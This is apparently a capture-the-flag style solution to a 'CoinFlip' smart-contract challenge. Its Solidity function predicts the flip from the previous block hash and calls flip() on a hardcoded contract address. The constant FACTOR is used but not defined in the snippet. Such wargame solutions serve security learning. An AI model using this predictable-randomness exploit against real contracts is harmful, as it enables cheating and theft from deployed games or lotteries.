# CoinFlip

```
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

function flipGuess() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    ICoinFlip(0x1BdB924013CAE2a91cF1f033Ff2e6f72BcDf0593).flip(side);
}
```
